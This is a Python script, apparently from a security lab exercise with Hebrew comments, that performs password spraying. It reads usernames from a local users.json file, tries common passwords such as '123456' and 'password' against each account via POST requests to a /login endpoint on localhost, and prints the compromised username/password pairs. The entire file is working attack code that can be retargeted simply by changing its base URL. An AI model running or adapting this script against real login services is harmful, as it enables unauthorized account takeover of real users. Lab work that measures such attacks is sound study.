import time
import json
import os
import requests
from config import GROUP_SEED

BASE_URL = "http://127.0.0.1:5000"

DATA_DIR = "data"
USERS_FILE = "users.json"
USERS_PATH = os.path.join(DATA_DIR, USERS_FILE)

# סיסמאות נפוצות/חשודות שננסה על הרבה משתמשים
CANDIDATE_PASSWORDS = [
    "123456",
    "12345678",
    "password",
    "qwerty",
    "11111111",
    "00000000",
    str(GROUP_SEED),  # Will match weak_user_01
    "yy93n52s",       # One medium password
]


def load_usernames(limit=None):
    """
    טוען את כל המשתמשים מ-users.json ומחזיר רשימת usernames.
    אפשר להגביל ל-N ראשונים עם limit.
    """
    if not os.path.exists(USERS_PATH):
        raise FileNotFoundError(f"Users file not found: {USERS_PATH}")

    with open(USERS_PATH, "r", encoding="utf-8") as f:
        data = json.load(f)

    usernames = [u["username"] for u in data]

    if limit is not None:
        usernames = usernames[:limit]

    return usernames


def password_spraying():
    # ניקח למשל את כל 30 המשתמשים (אפשר לשנות ל-limit=10 אם תרצה)
    usernames = load_usernames(limit=None)

    print(f"Loaded {len(usernames)} usernames from {USERS_PATH}")
    print(f"Candidate passwords: {CANDIDATE_PASSWORDS}")
    print("Starting password-spraying attack...\n")

    total_attempts = 0
    compromised_accounts = []  # רשימת (username, password)

    start = time.perf_counter()

    # לולאה בסגנון spraying:
    # קודם בוחרים סיסמה -> מנסים אותה על הרבה משתמשים
    for pw in CANDIDATE_PASSWORDS:
        print(f"[*] Trying password '{pw}' on all users...")

        for username in usernames:
            total_attempts += 1

            payload = {"username": username, "password": pw}
            resp = requests.post(f"{BASE_URL}/login", json=payload)

            if resp.status_code == 200:
                print(f"[+] SUCCESS: {username} compromised with password '{pw}'")
                compromised_accounts.append((username, pw))
            # אם תרצה – אפשר להוסיף כאן time.sleep קטן כדי לדמות תוקף "איטי"

    duration = time.perf_counter() - start
    attempts_per_sec = total_attempts / duration if duration > 0 else float("inf")

    print("\n=== Password-Spraying Summary ===")
    print(f"Total attempts: {total_attempts}")
    print(f"Total time: {duration:.4f} seconds")
    print(f"Attempts per second: {attempts_per_sec:.2f}")
    print(f"Total compromised accounts: {len(compromised_accounts)}")

    if compromised_accounts:
        print("Compromised list:")
        for username, pw in compromised_accounts:
            print(f"  - {username}: {pw}")
    else:
        print("No accounts compromised with given passwords.")


if __name__ == "__main__":
    password_spraying()

